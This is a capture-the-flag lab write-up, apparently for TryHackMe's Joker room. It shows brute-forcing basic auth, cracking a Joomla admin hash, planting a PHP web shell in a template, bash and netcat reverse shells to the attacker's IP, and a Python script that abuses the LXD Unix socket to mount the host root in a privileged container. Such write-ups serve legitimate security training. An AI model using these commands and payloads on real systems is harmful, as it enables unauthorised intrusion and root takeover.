#  Privilege Escalation via Snap Confinement Bypass (LXD API Socket)

## 1. Initial Reconnaissance & Enumeration

An initial Nmap scan was performed to profile open ports, running services, and application versions on the target machine.

Bash

```
nmap -sV -sC 10.49.184.245
```

The scan revealed three active ports:

- **Port 22:** OpenSSH 8.2p1
    
- **Port 80:** Apache httpd 2.4.41 (Title: `HA: Joker`)
    
- **Port 8080:** Apache httpd 2.4.41 (Returns an HTTP Basic Authentication `401 Unauthorized` prompt)
    

### Web Directory Fuzzing

Directory discovery was conducted on port 80 using `ffuf` to uncover hidden files or interesting pathways.

Bash

```
ffuf -u http://10.49.184.245/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php,.txt,.bak,.old -mc 200,301,302,403
```

This discovery yielded two key files:

- `/phpinfo.php`: Confirmed that code execution functions like `system()`, `exec()`, and `shell_exec()` were active on the server.
    
- `/secret.txt`: Contained a thematic dialogue between Batman and the Joker. The repetitive use of words like _"rock"_, _"break me"_, and _"dumb as a rock"_ strongly implied that a dictionary attack using the `rockyou.txt` wordlist would be effective.
    

## 2. Credential Cracking & Data Exfiltration

With port 8080 requesting basic authentication, a network brute-force attack was launched via `hydra` using the username `joker` and the `rockyou.txt` wordlist.

Bash

```
hydra -l joker -P /usr/share/wordlists/rockyou.txt 10.49.184.245 -s 8080 http-get /
```

> **Recovered Web Credentials:** `joker:hannah`

### Reviewing the Joomla Backup Archive

After logging into port 8080, an authenticated directory fuzzing scan exposed an uncompressed web backup directory containing a 12MB file named `backup`.

The backup archive was downloaded and extracted locally:

Bash

```
wget -q --user=joker --password=hannah http://10.49.184.245:8080/backup -O backup.file
unzip backup.file -d backup_extracted/
```

Reviewing the extracted files revealed configuration data and a database snapshot:

- `site/configuration.php`: Contained database connection strings, leaking a weak database password (`1234`) for a user named `joomla`.
    
- `db/joomladb.sql`: A full MySQL database dump containing the `cc1gr_users` table with an encrypted administrator password hash.
    

Bash

```
grep -A5 "INSERT INTO \`cc1gr_users\`" db/joomladb.sql
```

SQL

```
INSERT INTO cc1gr_users VALUES (547,'Super Duper User','admin','admin@example.com','$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG',...);
```

### Reversing the Administrator Hash

The target hash used a Blowfish/Bcrypt (`$2y$`) implementation. John the Ripper was used to reverse the cryptographic hash string:

Bash

```
echo '$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG' > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

> **Cracked CMS Administrative Password:** `admin:abcd1234`

## 3. Initial Access & Shell Stabilization

Using the cracked administrative credentials, a reverse shell was obtained by leveraging Joomla's native template management features.

1. Authenticated to the Joomla administrator console at `/administrator` using `admin:abcd1234`.
    
2. Navigated to **Extensions** $\rightarrow$ **Templates** $\rightarrow$ **Templates** $\rightarrow$ **Protostar Details and Files**.
    
3. Selected `index.php` and embedded a persistent web shell command hook at the top of the file layout:
    
    PHP
    
    ```
    <?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>
    ```
    

```
4.  Saved the template modification and triggered an interactive reverse shell back to a Penelope shell handler listener on Kali:
    ```bash
    curl -u joker:hannah "http://10.49.184.245:8080/index.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.132.218/4444+0>%261'"
```

The incoming connection was caught, providing initial low-privilege command access as `www-data`.

## 4. Environment Constraints: The Snap Packaging Issue

Checking user permissions with the `id` command confirmed that `www-data` belonged to the `lxd` local system group (`gid=115`). In ordinary circumstances, this allows for rapid container-based root privilege escalation.

However, trying to initiate or run any standard client utility check resulted in an AppArmor denial:

Bash

```
www-data@ip-10-49-165-161:/opt/joomla$ lxc image list
Sorry, home directories outside of /home needs configuration.
See https://forum.snapcraft.io/t/11209 for details.
```

### Root Cause Analysis

On modern Ubuntu deployments, LXD is distributed via **Snap packaging**, which operates within a strict sandboxed environment. When executing the `lxc` command-line utility, the snap daemon checks the real system home directory assigned within `/etc/passwd`. Because `www-data` defaults to `/var/www` (which sits outside the standard `/home/` prefix), the sandbox environment restricts execution. Standard path spoofing tricks like exporting a fake `$HOME` environment variable are insufficient to bypass this check.

## 5. Bypassing Confinement via Direct Socket API Interaction

While the `lxc` client wrapper binary is restricted by Snap’s filesystem check, the **LXD Unix socket** itself is not. Since `www-data` maintains group read/write privileges over the socket, the environment constraints can be bypassed completely by interacting directly with the hypervisor API via raw HTTP blocks over the local Unix socket.

### 1. Verifying API Access

A quick, standalone Python script confirmed unauthenticated communication with the local service engine:

Bash

```
python3 -c '
import socket
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/var/snap/lxd/common/lxd/unix.socket")
s.sendall(b"GET /1.0 HTTP/1.0\r\n\r\n")
print(s.recv(1024).decode())
'
```

The socket successfully returned a detailed system configuration JSON array, demonstrating direct administrative command control.

### 2. Tracking the Image Footprint

An optimized, minimal Alpine root filesystem image (`alpine-v3.13-x86_64-20210218_0139.tar.gz`) was downloaded and streamed directly into the LXD image store. Querying the socket confirmed the image was cataloged and ready:

Bash

```
python3 -c '
import socket
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/var/snap/lxd/common/lxd/unix.socket")
s.sendall(b"GET /1.0/images HTTP/1.1\r\nHost: localhost\r\n\r\n")
print(s.recv(4096).decode())
'
```

> **Image Identity Hash:** `cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b`

### 3. Container Initialization & Host Filesystem Mounting

Because container actions execute asynchronously, a sequenced Python routine was used to build the privileged container framework (`privsec`), configure it to merge with the host storage array, and change its state to active:

Python

```
import socket, json, time

def send(method, url, data=None):
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.connect("/var/snap/lxd/common/lxd/unix.socket")
    body = json.dumps(data) if data else ""
    req = f"{method} {url} HTTP/1.1\r\nHost: localhost\r\n"
    if body:
        req += f"Content-Type: application/json\r\nContent-Length: {len(body)}\r\n\r\n{body}"
    else:
        req += "\r\n"
    s.sendall(req.encode())
    res = s.recv(4096).decode()
    s.close()
    return res

FINGERPRINT = "cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b"

# Create a privileged instance container architecture
send("POST", "/1.0/instances", {
    "name": "privsec", 
    "source": {"type": "image", "fingerprint": FINGERPRINT}, 
    "config": {"security.privileged": "true"}
})
time.sleep(2) # Allow instantiation processing window

# Map the host OS root filesystem (/) straight to an accessible container path (/mnt/root)
send("PATCH", "/1.0/instances/privsec", {
    "devices": {
        "bypass": {
            "type": "disk", 
            "source": "/", 
            "path": "/mnt/root", 
            "recursive": "true"
        }
    }
})
time.sleep(1)

# Start the container instance execution thread
send("PUT", "/1.0/instances/privsec/state", {"action": "start"})
```

### 4. Executing the Root Privilege Call

With the privileged container successfully running the mounted host root storage drive, a final instruction payload triggered a root level reverse shell callback straight to the Kali control terminal on port `4445`:

Bash

```
python3 -c '
import socket, json
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/var/snap/lxd/common/lxd/unix.socket")
payload = {
    "command": ["sh", "-c", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.132.218 4445 >/tmp/f"],
    "environment": {}, "wait-for-websocket": False, "interactive": False
}
body = json.dumps(payload)
s.sendall(f"POST /1.0/instances/privsec/exec HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: {len(body)}\r\n\r\n{body}".encode())
'
```

## 6. Flag Recovery

The Netcat listener intercepted the incoming socket connection from the runtime container, spawning an interactive shell with complete administrative reading permissions over the physical system volume:

Plaintext

```
┌──(aj㉿kali)-[~/labs]
└─$ nc -lvnp 4445
listening on [any] 4445 ...
connect to [192.168.132.218] from (UNKNOWN) [10.49.165.161] 37183
sh: can't access tty; job control turned off

/root # cd /mnt/root/root
/mnt/root/root # ls -la
total 44
drwx------    7 root     root          4096 Oct 22  2025 .
-rw-r--r--    1 root     root          1003 Oct  8  2019 final.txt

/mnt/root/root # cat final.txt
```

Plaintext

```
     ██╗ ██████╗ ██╗  ██╗███████╗██████╗ 
     ██║██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗
     ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██   ██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
╚█████╔╝╚██████╔╝██║  ██╗███████╗██║  ██║
 ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                         
!! Congrats you have finished this task !!
```

---
🧑‍💻  https://tryhackme.com/p/4thul.exe